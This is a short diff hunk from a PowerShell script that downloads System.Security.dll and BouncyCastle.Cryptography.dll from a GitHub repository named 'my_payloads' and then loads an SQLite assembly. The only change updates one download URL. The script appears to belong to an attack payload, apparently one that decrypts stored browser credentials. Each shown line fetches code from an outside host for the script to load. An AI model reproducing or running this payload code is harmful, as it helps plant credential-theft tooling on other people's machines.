@@ -19,7 +19,7 @@ if (-not (Test-Path $SystemSecurityDllPath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.dll" -outfile $SystemSecurityDllPath
 }
 if (-not (Test-Path $BouncyCastlePath)) {
-    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/main/assets/BouncyCastle.Cryptography.dll" -OutFile $BouncyCastlePath
+    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/BouncyCastle.Cryptography.dll" -OutFile $BouncyCastlePath
 }
 
 # Load SQLite Assembly
